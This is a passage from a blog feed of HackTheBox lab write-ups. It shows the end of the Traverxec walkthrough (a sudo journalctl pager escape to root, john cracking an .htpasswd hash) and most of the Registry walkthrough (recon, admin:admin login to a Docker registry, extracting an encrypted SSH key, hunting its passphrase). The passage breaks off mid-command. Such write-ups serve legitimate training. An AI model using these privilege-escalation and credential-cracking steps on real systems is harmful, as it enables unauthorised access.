class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</span><br><span class="line">-- Logs begin at Mon 2019-11-18 07:00:54 EST, end at Mon 2019-11-18</span><br><span class="line">Nov 18 07:00:58 traverxec systemd[1]: Starting nostromo nhttpd serv</span><br><span class="line">Nov 18 07:00:58 traverxec systemd[1]: nostromo.service: Can<span class="string">&#x27;t open</span></span><br><span class="line"><span class="string">Nov 18 07:00:58 traverxec nhttpd[477]: started</span></span><br><span class="line"><span class="string">Nov 18 07:00:58 traverxec nhttpd[477]: max. file descriptors = 1040</span></span><br><span class="line"><span class="string">Nov 18 07:00:58 traverxec systemd[1]: Started nostromo nhttpd serve</span></span><br><span class="line"><span class="string">!/bin/sh</span></span><br><span class="line"><span class="string"># bash</span></span><br><span class="line"><span class="string">root@traverxec:/home/david/bin# cd</span></span><br><span class="line"><span class="string">root@traverxec:~# ls</span></span><br><span class="line"><span class="string">nostromo_1.9.6-1.deb  root.txt</span></span><br><span class="line"><span class="string">root@traverxec:~# cat root.txt</span></span><br><span class="line"><span class="string">9xxxxxxxxxxxxxxxxx6</span></span><br></pre></td></tr></table></figure><p>Now that we are root and done let’s not forget to clean up our changes to not spoil other users!</p><h2 id="Additional-notes"><a href="#Additional-notes" class="headerlink" title="Additional notes"></a>Additional notes</h2><p>I will put here a few additional information about this box that could be useful to others.</p><h3 id="htpassw-bruteforce"><a href="#htpassw-bruteforce" class="headerlink" title=".htpassw bruteforce"></a>.htpassw bruteforce</h3><p>As you could have noticed in the user flag recon part, a <code>.htpasswd</code> if available, this one is used to restrict access to the <code>protected-file-area</code> folder in <code>david</code> homedir:</p><p><img src="https://user-images.githubusercontent.com/9076747/71325453-6e9f3c80-24ed-11ea-8507-3c758091d65c.png" alt="basic auth traverxec"></p><p>It was possible to brute-force this <code>.htpasswd</code> file even if it was not needed to solve the box. Here how to do it using the good old <code>john</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/$ cat /var/nostromo/conf/.htpasswd</span><br><span class="line">david:$1$e7NfNpNi<span class="variable">$A6nCwOTqrNR2oDuIKirRZ</span>/</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;david:$1$e7NfNpNi<span class="variable">$A6nCwOTqrNR2oDuIKirRZ</span>/&quot;</span> &gt; david.hash</span><br><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt david.hash</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">Nowonly4me       (?)</span><br><span class="line">1g 0:00:01:35 DONE (2019-11-17 19:28) 0.01052g/s 111325p/s 111325c/s 111325C/s Noyoo..NovemberRain</span><br><span class="line">Session completed</span><br><span class="line">[hg8@archbook ~]$ john --show david.hash</span><br><span class="line">david:Nowonly4me</span><br></pre></td></tr></table></figure><p>Let’s now try to access the <code>protected-file-area</code> using those credentials:</p><p><img src="https://user-images.githubusercontent.com/9076747/71325488-f4bb8300-24ed-11ea-9885-e4ef90f7d370.png" alt="david homedir htaccess"></p><p>Success!</p><hr><p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Easy Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> john </tag>
            
            <tag> traverxec </tag>
            
            <tag> nhttpd </tag>
            
            <tag> nostromo </tag>
            
            <tag> Directory Transversal </tag>
            
            <tag> CVE-2019-16278 </tag>
            
            <tag> journalctl </tag>
            
            <tag> less </tag>
            
            <tag> GTFOBins </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Registry</title>
      <link href="/posts/registry/"/>
      <url>/posts/registry/</url>
      
        <content type="html"><![CDATA[<img width="586" alt="registry-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158642-6e7f4f00-9889-11ea-914c-557127a898c6.png"><p>Registry just retired on HackTheBox. It was my first hard box and was pretty interesting with real-life scenario like I love. This box shows the importance of understanding how things works “behind the scene” and to read all documentations carefully to not miss anything. I recommend this box for people  who finished few medium difficulty boxes and wants to level-up.</p><p><strong>Tl;Dr:</strong> The user flag consisted in finding an <code>INSTALL</code> archive containing install instruction and certificate to deploy an online docker registry, this certificate was used on the docker registry running on the box. Using this cert we could connect to the registry API and pull the docker image available on it. Running the docker image locally and doing recon into it allows to find an SSH key along with its passphrase. This key would allow to connect to the <code>bolt</code> user account and grab the user flag.<br>The root flag required to access a CMS after brute-forcing the admin password found in a sqlite database. From the CMS we pivot from the <code>bolt</code> user to <code>www-data</code> user by exploiting insecure file upload vulnerability. From <code>www-data</code> a backup software - restic - can be run as sudo without password. Using this software we are able to backup the whole <code>/root/</code> folder and restore its content with read privileges for <code>www-data</code> including the <code>root.txt</code> flag and a <code>.ssh/id_rsa</code> key allowing us to get a full shell as root.   </p><p>Alright! Let’s get into the details now!</p><hr><p>First thing first, let’s add the box IP to the host file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.171 registry.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC registry.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-27 10:58 CET</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp  open  http     nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Welcome to nginx!</span><br><span class="line">443/tcp open  ssl/http nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Welcome to nginx!</span><br><span class="line">| ssl-cert: Subject: commonName=docker.registry.htb</span><br><span class="line">| Not valid before: 2019-05-06T21:14:35</span><br><span class="line">|_Not valid after:  2029-05-03T21:14:35</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>Port <code>80</code>, <code>443</code> and <code>22</code> are open. </p><p>One interesting point, the SSL certificate have <code>docker.registry.htb</code> as <code>common Name</code>. Let’s add it to our host file as it can be useful later:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.159 docker.registry.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>Opening <code>http://regirstry.htb</code> display the default nginx page:</p><p><img src="https://user-images.githubusercontent.com/9076747/73365373-756b5d00-42ac-11ea-8134-e63c52f73b34.png" alt="default nginx page"></p><p>While <code>http://docker.registry.htb</code> return empty response:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl -i http://docker.registry.htb/</span><br><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.14.0 (Ubuntu)</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Strict-Transport-Security</span><span class="punctuation">: </span>max-age=63072000; includeSubdomains</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>DENY</span><br><span class="line"><span class="attribute">X-Content-Type-Options</span><span class="punctuation">: </span>nosniff</span><br></pre></td></tr></table></figure><p>That’s not much informations here… Let’s run <code>gobuster</code> to see if we can find more interesting stuff:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">&quot;https://registry.htb/&quot;</span> -w ~/SecLists/Discovery/Web-Content/big.txt -x php -k </span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/.bash_history (Status: 403)</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/install (Status: 301)</span><br><span class="line">/backup.php</span><br></pre></td></tr></table></figure><p>The backup endpoint must be used as a script to do…well…backups.  It doesn’t return anything either:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl -i registry.htb/backup.php                            </span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.14.0 (Ubuntu)</span><br><span class="line">Date: Fri, 07 Feb 2020 14:33:30 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Strict-Transport-Security: max-age=63072000; includeSubdomains</span><br><span class="line">X-Frame-Options: DENY</span><br><span class="line">X-Content-Type-Options: nosniff</span><br></pre></td></tr></table></figure><p>Next, opening the <code>install</code> endpoint shows some garbage:</p><p><img src="https://user-images.githubusercontent.com/9076747/73366783-ced48b80-42ae-11ea-8ad0-3583a3cacacf.png" alt="install file garbage"></p><p>Since we don’t have other endpoint so far let’s investigate a bit more on this last one. First let’s download this page to file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget http://registry.htb/install</span><br><span class="line">Saving to: ‘install’</span><br><span class="line">2020-01-29 15:54:07 (53.3 MB/s) - ‘install’ saved [1050]</span><br><span class="line">[hg8@archbook ~]$ file install</span><br><span class="line">install: gzip compressed data, last modified: Mon Jul 29 23:38:20 2019, from Unix, original size modulo 2^32 167772200 gzip compressed data, reserved method, has CRC, was <span class="string">&quot;&quot;</span>, from FAT filesystem (MS-DOS, OS/2, NT), original size modulo 2^32 167772200</span><br></pre></td></tr></table></figure><p>That’s interesting, the <code>file</code> utility indicate that the <code>install</code> file is a <code>gzip</code> archive. Let’s try to extract it. Out of habit I used <code>tar</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ tar -xzf install</span><br><span class="line"></span><br><span class="line">gzip: stdin: unexpected end of file</span><br><span class="line">tar: Child returned status 1</span><br><span class="line">tar: Error is not recoverable: exiting now</span><br></pre></td></tr></table></figure><p>Despite this bad looking error the files seems to have been extracted properly so that’s good:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ls -a</span><br><span class="line">.  ..  ca.crt  install  readme.md</span><br></pre></td></tr></table></figure><p><em>Note: Another way to access archive content when the archive seems corrupted it to use <code>zcat</code>:</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ zcat install</span><br><span class="line">ca.crt0000775000004100000410000000210613464123607012215 0ustar  www-datawww-data-----BEGIN CERTIFICATE-----</span><br><span class="line">MIIC/DCCAeSgAwIBAgIJAIFtFmFVTwEtMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV</span><br><span class="line">[...]</span><br><span class="line">QMPjq1S5SqXJqzop4OnthgWlwggSe/6z8ZTuDjdNIpx0tF77arh2rUOIXKIerx5B</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line">readme.md0000775000004100000410000000020113472260460012667 0ustar  www-datawww-data<span class="comment"># Private Docker Registry</span></span><br><span class="line"></span><br><span class="line">- https://docs.docker.com/registry/deploying/</span><br><span class="line">- https://docs.docker.com/engine/security/certificates/</span><br><span class="line"></span><br><span class="line">gzip: install: unexpected end of file</span><br></pre></td></tr></table></figure><p>So we got two files unzipped, a certificate <code>ca.crt</code> and a readme file <code>readme.md</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat ca.crt</span><br><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">MIIC/DCCAeSgAwIBAgIJAIFtFmFVTwEtMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV</span><br><span class="line">[...]</span><br><span class="line">QMPjq1S5SqXJqzop4OnthgWlwggSe/6z8ZTuDjdNIpx0tF77arh2rUOIXKIerx5B</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line">[hg8@archbook ~]$ cat readme.md</span><br><span class="line"><span class="comment"># Private Docker Registry</span></span><br><span class="line"></span><br><span class="line">- https://docs.docker.com/registry/deploying/</span><br><span class="line">- https://docs.docker.com/engine/security/certificates/</span><br></pre></td></tr></table></figure><p>The readme links to two pieces of documentation:</p><ol><li><p>Deployment of a private docker registry.</p></li><li><p>Verifying repository client with certificates</p></li></ol><p>These documentation make sense of what we found so far, <code>docker.registry.htb</code> is probably the API of a private docker registry, while the <code>ca.crt</code> might be used to connect to the registry securely. </p><h3 id="Docker-Registry"><a href="#Docker-Registry" class="headerlink" title="Docker Registry"></a>Docker Registry</h3><p>Now that we have an idea of what’s going on <code>docker.registry.htb</code> let’s make a bit of recon to see what we can do with this instance. First let’s run <code>gobuster</code> to see if we can find useful endpoints:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">&quot;https://docker.registry.htb/&quot;</span> -w ~/SecLists/Discovery/Web-Content/big.txt -x php -k</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/v2 (Status: 301)</span><br></pre></td></tr></table></figure><p>This <code>/v2</code>  endpoint confirms we are looking at an API. Let’s continue:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl -i docker.registry.htb/v2/</span><br><span class="line">HTTP/1.1 401 Unauthorized</span><br><span class="line">Server: nginx/1.14.0 (Ubuntu)</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Content-Length: 87</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Docker-Distribution-Api-Version: registry/2.0</span><br><span class="line">Www-Authenticate: Basic realm=<span class="string">&quot;Registry&quot;</span></span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;errors&quot;</span>:[&#123;<span class="string">&quot;code&quot;</span>:<span class="string">&quot;UNAUTHORIZED&quot;</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;authentication required&quot;</span>,<span class="string">&quot;detail&quot;</span>:null&#125;]&#125;</span><br></pre></td></tr></table></figure><p>Searching for this error redirect us to the valuable <a href="https://docs.docker.com/registry/spec/api/">Docker Registry API documentation</a> which will probably be super useful soon: </p><blockquote><p>If a <code>401 Unauthorized</code> response is returned, the client should take action based on the contents of the “WWW-Authenticate” header and try the endpoint again. Depending on access control setup, the client may still have to authenticate against different resources, even if this check succeeds.</p></blockquote><p><code>Www-Authenticate</code> that got returned to us indicate we have to authenticate through a <code>Basic</code> authentication method. We didn’t find any username or password yet so… let’s try the classic <code>admin:admin</code>?</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl -i -u admin:admin docker.registry.htb/v2/</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.14.0 (Ubuntu)</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Content-Length: 2</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Docker-Distribution-Api-Version: registry/2.0</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">Strict-Transport-Security: max-age=63072000; includeSubdomains</span><br><span class="line">X-Frame-Options: DENY</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line"></span><br><span class="line">&#123;&#125;%</span><br></pre></td></tr></table></figure><p>Alright! We have access to the Docker API Registry, the next logical step is to see if any docker image is stored on this registry. According to the documentation we can do so using the <code>_catalog</code> endpoint:</p><blockquote><p>Images are stored in collections, known as a <em>repository</em>, which is keyed by a <code>name</code>, as seen throughout the API specification. A registry instance may<br>contain several repositories. The list of available repositories is made<br>available through the <em>catalog</em>.</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl -u admin:admin http://docker.registry.htb/v2/_catalog</span><br><span class="line">&#123;<span class="string">&quot;repositories&quot;</span>:[<span class="string">&quot;bolt-image&quot;</span>]&#125;</span><br></pre></td></tr></table></figure><p>Great there is indeed an image, let’s pull it to investigate its content:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ docker pull docker.registry.htb/bolt-image</span><br><span class="line">Using default tag: latest</span><br><span class="line">Error response from daemon: Get https://docker.registry.htb/v2/: x509: certificate signed by unknown authority</span><br></pre></td></tr></table></figure><p>New error, certificate error…</p><p>Remember we found a documentation link and a certificate in the <code>install</code> archive? Let’s take a look, the solution is surely inside:</p><blockquote><p>A custom certificate is configured by creating a directory under <code>/etc/docker/certs.d</code> using the same name as the registry’s hostname, such as <code>localhost</code>. All <code>*.crt</code> files are added to this directory as CA roots.</p></blockquote><p>Let’s do this with the certificate we got in <code>install</code> archive:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo mkdir -p /etc/docker/certs.d/docker.registry.htb</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ sudo mv ca.crt /etc/docker/certs.d/docker.registry.htb/ca.crt</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ docker pull docker.registry.htb/bolt-image</span><br><span class="line">Using default tag: latest</span><br><span class="line">Error response from daemon: Get https://docker.registry.htb/v2/bolt-image/manifests/latest: no basic auth credentials</span><br></pre></td></tr></table></figure><p>We are getting closer! Let’s login to the docker using the <code>admin:admin</code> credentials:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ docker login -u admin -p admin http://docker.registry.htb</span><br><span class="line">WARNING! Using --password via the CLI is insecure. Use --password-stdin.</span><br><span class="line">WARNING! Your password will be stored unencrypted <span class="keyword">in</span> /home/hg8/.docker/config.json.</span><br><span class="line">Configure a credential helper to remove this warning. See</span><br><span class="line">https://docs.docker.com/engine/reference/commandline/login/<span class="comment">#credentials-store</span></span><br><span class="line"></span><br><span class="line">Login Succeeded</span><br></pre></td></tr></table></figure><p>Everything should now be in order, let’s pull this damn image:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ docker pull docker.registry.htb/bolt-image</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from bolt-image</span><br><span class="line">f476d66f5408: Pull complete</span><br><span class="line">302bfcb3f10c: Pull complete</span><br><span class="line">Digest: sha256:eeff225e5fae33dc832c3f82fd8b0db363a73eac4f0f0cb587094be54050539b</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> docker.registry.htb/bolt-image:latest</span><br><span class="line">docker.registry.htb/bolt-image:latest</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ docker images</span><br><span class="line">REPOSITORY                       TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">docker.registry.htb/bolt-image   latest              601499e98a60        8 months ago        362MB</span><br></pre></td></tr></table></figure><p>Looks all good now! We pulled the image and it can be ran locally. We can now start it and get a shell inside, so we can recon for interesting files:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ docker run -it 601499e98a60 /bin/bash</span><br><span class="line"></span><br><span class="line">root@6467ad831f74:/<span class="comment"># cd /root</span></span><br><span class="line">root@6467ad831f74:~<span class="comment"># ls -la</span></span><br><span class="line">total 28</span><br><span class="line">drwx------ 1 root root 4096 Jan 27 13:14 .</span><br><span class="line">drwxr-xr-x 1 root root 4096 Jan 27 13:08 ..</span><br><span class="line">lrwxrwxrwx 1 root root    9 May 25  2019 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc</span><br><span class="line">-rw-r--r-- 1 root root  148 May 25  2019 .profile</span><br><span class="line">drwxr-xr-x 2 root root 4096 May 25  2019 .ssh</span><br><span class="line">-rw------- 1 root root 1061 May 25  2019 .viminfo</span><br><span class="line">-rw-r--r-- 1 root root  215 Jan 27 13:14 .wget-hsts</span><br><span class="line">root@19e33fc3a2fa:~<span class="comment"># ls -a .ssh/</span></span><br><span class="line">.  ..  config  id_rsa  id_rsa.pub  known_hosts</span><br><span class="line">root@19e33fc3a2fa:~<span class="comment"># cat .ssh/config</span></span><br><span class="line">Host registry</span><br><span class="line">  User bolt</span><br><span class="line">  Port 22</span><br><span class="line">  Hostname registry.htb</span><br><span class="line">root@19e33fc3a2fa:~<span class="comment"># cat .ssh/id_rsa</span></span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: AES-128-CBC,1C98FA248505F287CCC597A59CF83AB9</span><br><span class="line"></span><br><span class="line">KF9YHXRjDZ35Q9ybzkhcUNKF8DSZ+aNLYXPL3kgdqlUqwfpqpbVdHbMeDk7qbS7w</span><br><span class="line">[...]</span><br><span class="line">94Vcvj5Kmzv0FxwVu4epWNkLTZCJPBszTKiaEWWS+OLDh7lrcmm+GP54MsLBWVpr</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>We have an<code>.ssh/</code> folder with private key and a username  <code>bolt</code> for <code>registry.htb</code> host. Looks a little too easy but let’s give a try:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa bolt@registry.htb</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;id_rsa&#x27;</span>:</span><br></pre></td></tr></table></figure><p>Of course it was too easy, the key need a passphrase and we didn’t find any yet… In these situations I usually try to run <code>john</code> to quickly brute-force the passphrase:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh2john id_rsa &gt; id_rsa.hash</span><br><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt id_rsa.hash</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">0g 0:00:00:18 DONE (2020-01-31 15:29) 0g/s 792796p/s 792796c/s 792796C/s </span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure><p>No luck here. To be honest it took me too much time to find this passphrase but, as usual, recon is always the key to progress and finally:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@02c3e9ee87d2:/<span class="comment"># grep -ri &quot;passphrase&quot; 2&gt;/dev/null</span></span><br><span class="line">[...]</span><br><span class="line">etc/profile.d/01-ssh.sh:expect <span class="string">&quot;Enter passphrase for /root/.ssh/id_rsa:&quot;</span></span><br><span class="line">root@02c3e9ee87d2:/<span class="comment"># cat etc/profile.d/01-ssh.sh</span></span><br><span class="line"><span class="comment">#!/usr/bin/expect -f</span></span><br><span class="line"><span class="comment">#eval `ssh-agent -s`</span></span><br><span class="line">spawn ssh-add /root/.ssh/id_rsa</span><br><span class="line">expect <span class="string">&quot;Enter passphrase for 